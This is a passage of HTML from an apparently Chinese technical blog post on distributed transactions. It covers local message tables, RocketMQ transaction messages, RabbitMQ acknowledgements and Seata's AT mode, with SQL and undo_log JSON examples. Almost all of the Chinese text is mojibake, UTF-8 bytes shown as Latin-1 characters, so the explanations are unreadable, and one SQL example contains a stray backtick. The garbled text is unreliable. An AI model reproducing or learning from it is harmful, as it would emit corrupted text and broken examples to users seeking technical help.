<li>å®šæ—¶ä»»åŠ¡ï¼šå®šæ—¶æ‰«ææ•°æ®åº“ä¸­çŠ¶æ€ä¸ºç¡®è®¤å‘é€çš„æ¶ˆæ¯ï¼Œç„¶åè¯¢é—®å¯¹åº”çš„äº‹åŠ¡å‘èµ·è€…ï¼Œäº‹åŠ¡ä¸šåŠ¡æ‰§è¡Œæ˜¯å¦æˆåŠŸï¼Œç»“æœï¼š<ul>
<li>ä¸šåŠ¡æ‰§è¡ŒæˆåŠŸï¼šå°è¯•å‘é€æ¶ˆæ¯ï¼ŒæˆåŠŸåä¿®æ”¹çŠ¶æ€ä¸ºå·²å‘é€</li>
<li>ä¸šåŠ¡æ‰§è¡Œå¤±è´¥ï¼šæŠŠæ•°æ®åº“æ¶ˆæ¯çŠ¶æ€ä¿®æ”¹ä¸ºå–æ¶ˆ</li>
</ul>
</li>
</ul>
<p>äº‹åŠ¡å‚ä¸è€…Bçš„åŸºæœ¬æ­¥éª¤ï¼š</p>
<ul>
<li>æ¥æ”¶æ¶ˆæ¯</li>
<li>å¼€å¯æœ¬åœ°äº‹åŠ¡</li>
<li>æ‰§è¡Œä¸šåŠ¡</li>
<li>é€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œæ¶ˆæ¯å·²ç»æ¥æ”¶å’Œå¤„ç†</li>
<li>æäº¤äº‹åŠ¡</li>
</ul>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>è§£é™¤äº†äº‹åŠ¡ä¸šåŠ¡ä¸æ¶ˆæ¯ç›¸å…³ä¸šåŠ¡çš„è€¦åˆ</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>å®ç°èµ·æ¥æ¯”è¾ƒå¤æ‚</li>
</ul>
<h4 id="RocketMQäº‹åŠ¡æ¶ˆæ¯"><a href="#RocketMQäº‹åŠ¡æ¶ˆæ¯" class="headerlink" title="RocketMQäº‹åŠ¡æ¶ˆæ¯"></a>RocketMQäº‹åŠ¡æ¶ˆæ¯</h4><p>RocketMQæœ¬èº«è‡ªå¸¦äº†äº‹åŠ¡æ¶ˆæ¯ï¼Œå¯ä»¥ä¿è¯æ¶ˆæ¯çš„å¯é æ€§ï¼ŒåŸç†å…¶å®å°±æ˜¯è‡ªå¸¦äº†æœ¬åœ°æ¶ˆæ¯è¡¨ï¼Œä¸æˆ‘ä»¬ä¸Šé¢è®²çš„æ€è·¯ç±»ä¼¼ã€‚</p>
<h4 id="RabbitMQçš„æ¶ˆæ¯ç¡®è®¤"><a href="#RabbitMQçš„æ¶ˆæ¯ç¡®è®¤" class="headerlink" title="RabbitMQçš„æ¶ˆæ¯ç¡®è®¤"></a>RabbitMQçš„æ¶ˆæ¯ç¡®è®¤</h4><p>RabbitMQç¡®ä¿æ¶ˆæ¯ä¸ä¸¢å¤±çš„æ€è·¯æ¯”è¾ƒå¥‡ç‰¹ï¼Œå¹¶æ²¡æœ‰ä½¿ç”¨ä¼ ç»Ÿçš„æœ¬åœ°è¡¨ï¼Œè€Œæ˜¯åˆ©ç”¨äº†æ¶ˆæ¯çš„ç¡®è®¤æœºåˆ¶ï¼š</p>
<ul>
<li>ç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶ï¼šç¡®ä¿æ¶ˆæ¯ä»ç”Ÿäº§è€…åˆ°è¾¾MQä¸ä¼šæœ‰é—®é¢˜<ul>
<li>æ¶ˆæ¯ç”Ÿäº§è€…å‘é€æ¶ˆæ¯åˆ°RabbitMQæ—¶ï¼Œå¯ä»¥è®¾ç½®ä¸€ä¸ªå¼‚æ­¥çš„ç›‘å¬å™¨ï¼Œç›‘å¬æ¥è‡ªMQçš„ACK</li>
<li>MQæ¥æ”¶åˆ°æ¶ˆæ¯åï¼Œä¼šè¿”å›ä¸€ä¸ªå›æ‰§ç»™ç”Ÿäº§è€…ï¼š<ul>
<li>æ¶ˆæ¯åˆ°è¾¾äº¤æ¢æœºåè·¯ç”±å¤±è´¥ï¼Œä¼šè¿”å›å¤±è´¥ACK</li>
<li>æ¶ˆæ¯è·¯ç”±æˆåŠŸï¼ŒæŒä¹…åŒ–å¤±è´¥ï¼Œä¼šè¿”å›å¤±è´¥ACK</li>
<li>æ¶ˆæ¯è·¯ç”±æˆåŠŸï¼ŒæŒä¹…åŒ–æˆåŠŸï¼Œä¼šè¿”å›æˆåŠŸACK</li>
</ul>
</li>
<li>ç”Ÿäº§è€…æå‰ç¼–å†™å¥½ä¸åŒå›æ‰§çš„å¤„ç†æ–¹å¼<ul>
<li>å¤±è´¥å›æ‰§ï¼šç­‰å¾…ä¸€å®šæ—¶é—´åé‡æ–°å‘é€</li>
<li>æˆåŠŸå›æ‰§ï¼šè®°å½•æ—¥å¿—ç­‰è¡Œä¸º</li>
</ul>
</li>
</ul>
</li>
<li>æ¶ˆè´¹è€…ç¡®è®¤æœºåˆ¶ï¼šç¡®ä¿æ¶ˆæ¯èƒ½å¤Ÿè¢«æ¶ˆè´¹è€…æ­£ç¡®æ¶ˆè´¹<ul>
<li>æ¶ˆè´¹è€…éœ€è¦åœ¨ç›‘å¬é˜Ÿåˆ—çš„æ—¶å€™æŒ‡å®šæ‰‹åŠ¨ACKæ¨¡å¼</li>
<li>RabbitMQæŠŠæ¶ˆæ¯æŠ•é€’ç»™æ¶ˆè´¹è€…åï¼Œä¼šç­‰å¾…æ¶ˆè´¹è€…ACKï¼Œæ¥æ”¶åˆ°ACKåæ‰åˆ é™¤æ¶ˆæ¯ï¼Œå¦‚æœæ²¡æœ‰æ¥æ”¶åˆ°ACKæ¶ˆæ¯ä¼šä¸€ç›´ä¿ç•™åœ¨æœåŠ¡ç«¯ï¼Œå¦‚æœæ¶ˆè´¹è€…æ–­å¼€è¿æ¥æˆ–å¼‚å¸¸åï¼Œæ¶ˆæ¯ä¼šæŠ•é€’ç»™å…¶å®ƒæ¶ˆè´¹è€…ã€‚</li>
<li>æ¶ˆè´¹è€…å¤„ç†å®Œæ¶ˆæ¯ï¼Œæäº¤äº‹åŠ¡åï¼Œæ‰‹åŠ¨ACKã€‚å¦‚æœæ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œåˆ™ä¸ä¼šACKï¼Œä¸šåŠ¡å¤„ç†å¤±è´¥ï¼Œç­‰å¾…ä¸‹ä¸€æ¡æ¶ˆæ¯</li>
</ul>
</li>
</ul>
<p>ç»è¿‡ä¸Šé¢çš„ä¸¤ç§ç¡®è®¤æœºåˆ¶ï¼Œå¯ä»¥ç¡®ä¿ä»æ¶ˆæ¯ç”Ÿäº§è€…åˆ°æ¶ˆè´¹è€…çš„æ¶ˆæ¯å®‰å…¨ï¼Œå†ç»“åˆç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¸¤ç«¯çš„æœ¬åœ°äº‹åŠ¡ï¼Œå³å¯ä¿è¯ä¸€ä¸ªåˆ†å¸ƒå¼äº‹åŠ¡çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚</p>
<h4 id="æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹"><a href="#æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹"></a>æ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹</h4><p>æ€»ç»“ä¸Šé¢çš„å‡ ç§æ¨¡å‹ï¼Œæ¶ˆæ¯äº‹åŠ¡çš„ä¼˜ç¼ºç‚¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¼˜ç‚¹ï¼š<ul>
<li>ç›¸å¯¹TCCï¼Œä»£ç ä¾µå…¥è¾ƒå°‘</li>
<li>ä¸šåŠ¡ç›¸å¯¹ç®€å•</li>
<li>æ˜¯å¤šä¸ªæœ¬åœ°äº‹åŠ¡çš„ç»“åˆï¼Œå› æ­¤èµ„æºé”å®šå‘¨æœŸçŸ­ï¼Œæ€§èƒ½å¥½</li>
</ul>
</li>
<li>ç¼ºç‚¹ï¼š<ul>
<li>ä¾èµ–äºMQçš„å¯é æ€§</li>
<li>æ¶ˆæ¯å‘èµ·è€…å¯ä»¥å›æ»šï¼Œä½†æ˜¯æ¶ˆæ¯å‚ä¸è€…æ— æ³•å¼•èµ·äº‹åŠ¡å›æ»š</li>
<li>äº‹åŠ¡æ—¶æ•ˆæ€§å·®ï¼Œå–å†³äºMQæ¶ˆæ¯å‘é€æ˜¯å¦åŠæ—¶ï¼Œè¿˜æœ‰æ¶ˆæ¯å‚ä¸è€…çš„æ‰§è¡Œæƒ…å†µ</li>
</ul>
</li>
</ul>
<p>é’ˆå¯¹äº‹åŠ¡æ— æ³•å›æ»šçš„é—®é¢˜ï¼Œæœ‰äººæå‡ºè¯´å¯ä»¥å†äº‹åŠ¡å‚ä¸è€…æ‰§è¡Œå¤±è´¥åï¼Œå†æ¬¡åˆ©ç”¨MQé€šçŸ¥æ¶ˆæ¯æœåŠ¡ï¼Œç„¶åç”±æ¶ˆæ¯æœåŠ¡é€šçŸ¥å…¶ä»–å‚ä¸è€…å›æ»šã€‚é‚£ä¹ˆï¼Œæ­å–œä½ ï¼Œä½ åˆ©ç”¨MQå’Œè‡ªå®šä¹‰çš„æ¶ˆæ¯æœåŠ¡å†æ¬¡å®ç°äº†2PC æ¨¡å‹ï¼Œåˆé€ äº†ä¸€ä¸ªå¤§è½®å­</p>
<h3 id="ATæ¨¡å¼"><a href="#ATæ¨¡å¼" class="headerlink" title="ATæ¨¡å¼"></a>ATæ¨¡å¼</h3><p>2019å¹´ 1 æœˆä»½ï¼ŒSeata å¼€æºäº† AT æ¨¡å¼ã€‚AT æ¨¡å¼æ˜¯ä¸€ç§<strong>æ— ä¾µå…¥</strong>çš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚å¯ä»¥çœ‹åšæ˜¯å¯¹TCCæ¨¡å¼çš„ä¸€ç§ä¼˜åŒ–ï¼Œè§£å†³äº†TCCæ¨¡å¼ä¸­çš„ä»£ç ä¾µå…¥ã€ç¼–ç å¤æ‚ç­‰é—®é¢˜ã€‚</p>
<p>åœ¨ AT æ¨¡å¼ä¸‹ï¼Œç”¨æˆ·åªéœ€å…³æ³¨è‡ªå·±çš„â€œä¸šåŠ¡ SQLâ€ï¼Œç”¨æˆ·çš„ â€œä¸šåŠ¡ SQLâ€ ä½œä¸ºä¸€é˜¶æ®µï¼ŒSeata æ¡†æ¶ä¼šè‡ªåŠ¨ç”Ÿæˆäº‹åŠ¡çš„äºŒé˜¶æ®µæäº¤å’Œå›æ»šæ“ä½œã€‚</p>
<p>å¯ä»¥å‚è€ƒSeataçš„<a href="https://seata.io/zh-cn/docs/dev/mode/at-mode.html">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<h4 id="åŸºæœ¬åŸç†-2"><a href="#åŸºæœ¬åŸç†-2" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h4><p>å…ˆæ¥çœ‹ä¸€å¼ æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022729.png" alt="image-20200305212340203"></p>
<p>æœ‰æ²¡æœ‰æ„Ÿè§‰è·ŸTCCçš„æ‰§è¡Œå¾ˆåƒï¼Œéƒ½æ˜¯åˆ†ä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ul>
<li>ä¸€é˜¶æ®µï¼šæ‰§è¡Œæœ¬åœ°äº‹åŠ¡ï¼Œå¹¶è¿”å›æ‰§è¡Œç»“æœ</li>
<li>äºŒé˜¶æ®µï¼šæ ¹æ®ä¸€é˜¶æ®µçš„ç»“æœï¼Œåˆ¤æ–­äºŒé˜¶æ®µåšæ³•ï¼šæäº¤æˆ–å›æ»š</li>
</ul>
<p>ä½†ATæ¨¡å¼åº•å±‚åšçš„äº‹æƒ…å¯å®Œå…¨ä¸åŒï¼Œè€Œä¸”ç¬¬äºŒé˜¶æ®µæ ¹æœ¬ä¸éœ€è¦æˆ‘ä»¬ç¼–å†™ï¼Œå…¨éƒ¨æœ‰Seataè‡ªå·±å®ç°äº†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šæˆ‘ä»¬å†™çš„<strong>ä»£ç ä¸æœ¬åœ°äº‹åŠ¡æ—¶ä»£ç ä¸€æ ·</strong>ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†åˆ†å¸ƒå¼äº‹åŠ¡ã€‚</p>
<p>é‚£ä¹ˆï¼ŒATæ¨¡å¼å¦‚ä½•å®ç°æ— ä»£ç ä¾µå…¥ï¼Œå¦‚ä½•å¸®æˆ‘ä»¬è‡ªåŠ¨å®ç°äºŒé˜¶æ®µä»£ç çš„å‘¢ï¼Ÿ</p>
<blockquote>
<p>ä¸€é˜¶æ®µ</p>
</blockquote>
<p>åœ¨ä¸€é˜¶æ®µï¼ŒSeata ä¼šæ‹¦æˆªâ€œä¸šåŠ¡ SQLâ€ï¼Œé¦–å…ˆè§£æ SQL è¯­ä¹‰ï¼Œæ‰¾åˆ°â€œ<code>ä¸šåŠ¡ SQL</code>â€è¦æ›´æ–°çš„ä¸šåŠ¡æ•°æ®ï¼Œåœ¨ä¸šåŠ¡æ•°æ®è¢«æ›´æ–°å‰ï¼Œå°†å…¶ä¿å­˜æˆâ€œ<code>before image</code>â€ï¼Œç„¶åæ‰§è¡Œâ€œ<code>ä¸šåŠ¡ SQL</code>â€æ›´æ–°ä¸šåŠ¡æ•°æ®ï¼Œåœ¨ä¸šåŠ¡æ•°æ®æ›´æ–°ä¹‹åï¼Œå†å°†å…¶ä¿å­˜æˆâ€œ<code>after image</code>â€ï¼Œæœ€åè·å–å…¨å±€è¡Œé”ï¼Œ<strong>æäº¤äº‹åŠ¡</strong>ã€‚ä»¥ä¸Šæ“ä½œå…¨éƒ¨åœ¨ä¸€ä¸ªæ•°æ®åº“äº‹åŠ¡å†…å®Œæˆï¼Œè¿™æ ·ä¿è¯äº†ä¸€é˜¶æ®µæ“ä½œçš„åŸå­æ€§ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022730.png" alt="image-20200305213652558"></p>
<blockquote>
<p>äºŒé˜¶æ®µæäº¤</p>
</blockquote>
<p>äºŒé˜¶æ®µå¦‚æœæ˜¯æäº¤çš„è¯ï¼Œå› ä¸ºâ€œ<code>ä¸šåŠ¡ SQL</code>â€åœ¨ä¸€é˜¶æ®µå·²ç»æäº¤è‡³æ•°æ®åº“ï¼Œ æ‰€ä»¥ Seata æ¡†æ¶åªéœ€å°†ä¸€é˜¶æ®µä¿å­˜çš„å¿«ç…§æ•°æ®å’Œè¡Œé”åˆ æ‰ï¼Œå®Œæˆæ•°æ®æ¸…ç†å³å¯ã€‚</p>
<blockquote>
<p>äºŒé˜¶æ®µå›æ»šï¼š</p>
</blockquote>
<p>äºŒé˜¶æ®µå¦‚æœæ˜¯å›æ»šçš„è¯ï¼ŒSeata å°±éœ€è¦å›æ»šä¸€é˜¶æ®µå·²ç»æ‰§è¡Œçš„â€œ<code>ä¸šåŠ¡ SQL</code>â€ï¼Œè¿˜åŸä¸šåŠ¡æ•°æ®ã€‚å›æ»šæ–¹å¼ä¾¿æ˜¯ç”¨â€œ<code>before image</code>â€è¿˜åŸä¸šåŠ¡æ•°æ®ï¼›ä½†åœ¨è¿˜åŸå‰è¦é¦–å…ˆè¦æ ¡éªŒè„å†™ï¼Œå¯¹æ¯”â€œæ•°æ®åº“å½“å‰ä¸šåŠ¡æ•°æ®â€å’Œ â€œ<code>after image</code>â€ï¼Œå¦‚æœä¸¤ä»½æ•°æ®å®Œå…¨ä¸€è‡´å°±è¯´æ˜æ²¡æœ‰è„å†™ï¼Œå¯ä»¥è¿˜åŸä¸šåŠ¡æ•°æ®ï¼Œå¦‚æœä¸ä¸€è‡´å°±è¯´æ˜æœ‰<code>è„å†™</code>ï¼Œå‡ºç°è„å†™å°±éœ€è¦è½¬äººå·¥å¤„ç†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022731.png" alt="image-20200305214649845"></p>
<p>ä¸è¿‡å› ä¸ºæœ‰å…¨å±€é”æœºåˆ¶ï¼Œæ‰€ä»¥å¯ä»¥é™ä½å‡ºç°<code>è„å†™</code>çš„æ¦‚ç‡ã€‚</p>
<p>AT æ¨¡å¼çš„ä¸€é˜¶æ®µã€äºŒé˜¶æ®µæäº¤å’Œå›æ»šå‡ç”± Seata æ¡†æ¶è‡ªåŠ¨ç”Ÿæˆï¼Œç”¨æˆ·åªéœ€ç¼–å†™â€œä¸šåŠ¡ SQLâ€ï¼Œä¾¿èƒ½è½»æ¾æ¥å…¥åˆ†å¸ƒå¼äº‹åŠ¡ï¼ŒAT æ¨¡å¼æ˜¯ä¸€ç§å¯¹ä¸šåŠ¡æ— ä»»ä½•ä¾µå…¥çš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚</p>
<h4 id="è¯¦ç»†æ¶æ„å’Œæµç¨‹"><a href="#è¯¦ç»†æ¶æ„å’Œæµç¨‹" class="headerlink" title="è¯¦ç»†æ¶æ„å’Œæµç¨‹"></a>è¯¦ç»†æ¶æ„å’Œæµç¨‹</h4><p>Seataä¸­çš„å‡ ä¸ªåŸºæœ¬æ¦‚å¿µï¼š</p>
<ul>
<li><p>TCï¼ˆTransaction Coordinatorï¼‰ - äº‹åŠ¡åè°ƒè€…</p>
<p>ç»´æŠ¤å…¨å±€å’Œåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œé©±åŠ¨å…¨å±€äº‹åŠ¡æäº¤æˆ–å›æ»šï¼ˆTMä¹‹é—´çš„åè°ƒè€…ï¼‰ã€‚</p>
</li>
<li><p>TMï¼ˆTransaction Managerï¼‰ - äº‹åŠ¡ç®¡ç†å™¨</p>
<p>å®šä¹‰å…¨å±€äº‹åŠ¡çš„èŒƒå›´ï¼šå¼€å§‹å…¨å±€äº‹åŠ¡ã€æäº¤æˆ–å›æ»šå…¨å±€äº‹åŠ¡ã€‚</p>
</li>
<li><p>RMï¼ˆResource Managerï¼‰ - èµ„æºç®¡ç†å™¨</p>
<p>ç®¡ç†åˆ†æ”¯äº‹åŠ¡å¤„ç†çš„èµ„æºï¼Œä¸TCäº¤è°ˆä»¥æ³¨å†Œåˆ†æ”¯äº‹åŠ¡å’ŒæŠ¥å‘Šåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œå¹¶é©±åŠ¨åˆ†æ”¯äº‹åŠ¡æäº¤æˆ–å›æ»šã€‚</p>
</li>
</ul>
<p>æˆ‘ä»¬çœ‹ä¸‹é¢çš„ä¸€ä¸ªæ¶æ„å›¾</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022732.png" alt="image-20200305225811888"></p>
<ul>
<li>TMï¼šä¸šåŠ¡æ¨¡å—ä¸­å…¨å±€äº‹åŠ¡çš„å¼€å¯è€…<ul>
<li>å‘TCå¼€å¯ä¸€ä¸ªå…¨å±€äº‹åŠ¡</li>
<li>è°ƒç”¨å…¶å®ƒå¾®æœåŠ¡</li>
</ul>
</li>
<li>RMï¼šä¸šåŠ¡æ¨¡å—æ‰§è¡Œè€…ä¸­ï¼ŒåŒ…å«RMéƒ¨åˆ†ï¼Œè´Ÿè´£å‘TCæ±‡æŠ¥äº‹åŠ¡æ‰§è¡ŒçŠ¶æ€<ul>
<li>æ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>å‘TCæ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œå¹¶æäº¤æœ¬åœ°äº‹åŠ¡æ‰§è¡Œç»“æœ</li>
</ul>
</li>
<li>TMï¼šç»“æŸå¯¹å¾®æœåŠ¡çš„è°ƒç”¨ï¼Œé€šçŸ¥TCï¼Œå…¨å±€äº‹åŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œäº‹åŠ¡ä¸€é˜¶æ®µç»“æŸ</li>
<li>TCï¼šæ±‡æ€»å„ä¸ªåˆ†æ”¯äº‹åŠ¡æ‰§è¡Œç»“æœï¼Œå†³å®šåˆ†å¸ƒå¼äº‹åŠ¡æ˜¯æäº¤è¿˜æ˜¯å›æ»šï¼›</li>
<li>TC é€šçŸ¥æ‰€æœ‰ RM æäº¤&#x2F;å›æ»š èµ„æºï¼Œäº‹åŠ¡äºŒé˜¶æ®µç»“æŸã€‚</li>
</ul>
<p>ä¸€é˜¶æ®µï¼š</p>
<ul>
<li>TMå¼€å¯å…¨å±€äº‹åŠ¡ï¼Œå¹¶å‘TCå£°æ˜å…¨å±€äº‹åŠ¡ï¼ŒåŒ…æ‹¬å…¨å±€äº‹åŠ¡XIDä¿¡æ¯</li>
<li>TMæ‰€åœ¨æœåŠ¡è°ƒç”¨å…¶å®ƒå¾®æœåŠ¡</li>
<li>å¾®æœåŠ¡ï¼Œä¸»è¦æœ‰RMæ¥æ‰§è¡Œ<ul>
<li>æŸ¥è¯¢<code>before_image</code></li>
<li>æ‰§è¡Œæœ¬åœ°äº‹åŠ¡</li>
<li>æŸ¥è¯¢<code>after_image</code></li>
<li>ç”Ÿæˆ<code>undo_log</code>å¹¶å†™å…¥æ•°æ®åº“</li>
<li>å‘TCæ³¨å†Œåˆ†æ”¯äº‹åŠ¡ï¼Œå‘ŠçŸ¥äº‹åŠ¡æ‰§è¡Œç»“æœ</li>
<li>è·å–å…¨å±€é”ï¼ˆé˜»æ­¢å…¶å®ƒå…¨å±€äº‹åŠ¡å¹¶å‘ä¿®æ”¹å½“å‰æ•°æ®ï¼‰</li>
<li>é‡Šæ”¾æœ¬åœ°é”ï¼ˆä¸å½±å“å…¶å®ƒä¸šåŠ¡å¯¹æ•°æ®çš„æ“ä½œï¼‰</li>
</ul>
</li>
<li>å¾…æ‰€æœ‰ä¸šåŠ¡æ‰§è¡Œå®Œæ¯•ï¼Œäº‹åŠ¡å‘èµ·è€…ï¼ˆTMï¼‰ä¼šå°è¯•å‘TCæäº¤å…¨å±€äº‹åŠ¡</li>
</ul>
<p>äºŒé˜¶æ®µï¼š</p>
<ul>
<li>TCç»Ÿè®¡åˆ†æ”¯äº‹åŠ¡æ‰§è¡Œæƒ…å†µï¼Œæ ¹æ®ç»“æœåˆ¤æ–­ä¸‹ä¸€æ­¥è¡Œä¸º<ul>
<li>åˆ†æ”¯éƒ½æˆåŠŸï¼šé€šçŸ¥åˆ†æ”¯äº‹åŠ¡ï¼Œæäº¤äº‹åŠ¡</li>
<li>æœ‰åˆ†æ”¯æ‰§è¡Œå¤±è´¥ï¼šé€šçŸ¥æ‰§è¡ŒæˆåŠŸçš„åˆ†æ”¯äº‹åŠ¡ï¼Œå›æ»šæ•°æ®</li>
</ul>
</li>
<li>åˆ†æ”¯äº‹åŠ¡çš„RM<ul>
<li>æäº¤äº‹åŠ¡ï¼šç›´æ¥æ¸…ç©º<code>before_image</code>å’Œ<code>after_image</code>ä¿¡æ¯ï¼Œé‡Šæ”¾å…¨å±€é”</li>
<li>å›æ»šäº‹åŠ¡ï¼š<ul>
<li>æ ¡éªŒafter_imageï¼Œåˆ¤æ–­æ˜¯å¦æœ‰è„å†™</li>
<li>å¦‚æœæ²¡æœ‰è„å†™ï¼Œå›æ»šæ•°æ®åˆ°<code>before_image</code>ï¼Œæ¸…é™¤<code>before_image</code>å’Œ<code>after_image</code></li>
<li>å¦‚æœæœ‰è„å†™ï¼Œè¯·æ±‚äººå·¥ä»‹å…¥</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="å·¥ä½œæœºåˆ¶"><a href="#å·¥ä½œæœºåˆ¶" class="headerlink" title="å·¥ä½œæœºåˆ¶"></a>å·¥ä½œæœºåˆ¶</h4><p>è¯¦è§Seataçš„å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://seata.io/zh-cn/docs/overview/what-is-seata.html">https://seata.io/zh-cn/docs/overview/what-is-seata.html</a></p>
<blockquote>
<h4 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h4></blockquote>
<p>ä»¥ä¸€ä¸ªç¤ºä¾‹æ¥è¯´æ˜æ•´ä¸ª AT åˆ†æ”¯çš„å·¥ä½œè¿‡ç¨‹ã€‚</p>
<p>ä¸šåŠ¡è¡¨ï¼š<code>product</code></p>
<table>
<thead>
<tr>
<th>Field</th>
<th>Type</th>
<th>Key</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>bigint(20)</td>
<td>PRI</td>
</tr>
<tr>
<td>name</td>
<td>varchar(100)</td>
<td></td>
</tr>
<tr>
<td>since</td>
<td>varchar(100)</td>
<td></td>
</tr>
</tbody></table>
<p>AT åˆ†æ”¯äº‹åŠ¡çš„ä¸šåŠ¡é€»è¾‘ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> product <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;GTS&#x27;</span> <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="ä¸€é˜¶æ®µ"><a href="#ä¸€é˜¶æ®µ" class="headerlink" title="ä¸€é˜¶æ®µ"></a>ä¸€é˜¶æ®µ</h4></blockquote>
<p>è¿‡ç¨‹ï¼š</p>
<ol>
<li>è§£æ SQLï¼šå¾—åˆ° SQL çš„ç±»å‹ï¼ˆUPDATEï¼‰ï¼Œè¡¨ï¼ˆproductï¼‰ï¼Œæ¡ä»¶ï¼ˆwhere name &#x3D; â€˜TXCâ€™ï¼‰ç­‰ç›¸å…³çš„ä¿¡æ¯ã€‚</li>
<li>æŸ¥è¯¢å‰é•œåƒï¼šæ ¹æ®è§£æå¾—åˆ°çš„æ¡ä»¶ä¿¡æ¯ï¼Œç”ŸæˆæŸ¥è¯¢è¯­å¥ï¼Œå®šä½æ•°æ®ã€‚</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;TXC&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å‰é•œåƒï¼š</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>TXC</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>æ‰§è¡Œä¸šåŠ¡ SQLï¼šæ›´æ–°è¿™æ¡è®°å½•çš„ name ä¸º â€˜GTSâ€™ã€‚</li>
<li>æŸ¥è¯¢åé•œåƒï¼šæ ¹æ®å‰é•œåƒçš„ç»“æœï¼Œé€šè¿‡ <strong>ä¸»é”®</strong> å®šä½æ•°æ®ã€‚</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id, name, since <span class="keyword">from</span> product <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>`;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°åé•œåƒï¼š</p>
<table>
<thead>
<tr>
<th>id</th>
<th>name</th>
<th>since</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>GTS</td>
<td>2014</td>
</tr>
</tbody></table>
<ol>
<li>æ’å…¥å›æ»šæ—¥å¿—ï¼šæŠŠå‰åé•œåƒæ•°æ®ä»¥åŠä¸šåŠ¡ SQL ç›¸å…³çš„ä¿¡æ¯ç»„æˆä¸€æ¡å›æ»šæ—¥å¿—è®°å½•ï¼Œæ’å…¥åˆ° <code>UNDO_LOG</code> è¡¨ä¸­ã€‚</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;branchId&quot;</span><span class="punctuation">:</span> <span class="number">641789253</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;undoItems&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;afterImage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;rows&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;id&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">12</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GTS&quot;</span></span><br><span class="line">				<span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span 